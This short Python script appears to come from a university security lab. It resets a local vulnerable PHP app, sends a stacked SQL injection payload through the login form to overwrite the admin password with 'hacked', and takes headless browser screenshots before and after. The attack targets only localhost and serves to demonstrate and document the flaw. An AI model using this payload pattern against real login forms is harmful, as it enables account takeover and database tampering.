import requests
import subprocess
import time
import os

BASE_URL = "http://localhost:8080/sns_lab5"
DB_INIT_URL = f"{BASE_URL}/db_init.php"
VULN_URL = f"{BASE_URL}/vulnerable_app/authentication.php"

def reset_db():
    print("[*] Resetting Database...")
    requests.get(DB_INIT_URL)
    
def execute_modification():
    print("[*] Executing DB Modification Attack...")
    payload = "'; UPDATE users SET password='hacked' WHERE username='admin' -- "
    data = {'username': payload, 'password': '123'}
    requests.post(VULN_URL, data=data)

def take_screenshot(filename):
    print(f"[*] Taking screenshot: {filename}")
    edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    cmd = [
        edge_path,
        "--headless",
        "--disable-gpu",
        f"--screenshot={filename}",
        "--window-size=1280,720",
        "--virtual-time-budget=2000",
        "http://localhost:8888/auto_submit.html"
    ]
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

if __name__ == "__main__":
    out_dir = r"C:\xampp\htdocs\sns_lab5\Screenshots"
    if not os.path.exists(out_dir):
        os.makedirs(out_dir)
        
    reset_db()
    take_screenshot(os.path.join(out_dir, "1_Before_Modification.png"))
    
    execute_modification()
    take_screenshot(os.path.join(out_dir, "2_After_Modification.png"))
    
    print("[*] All screenshots taken successfully!")
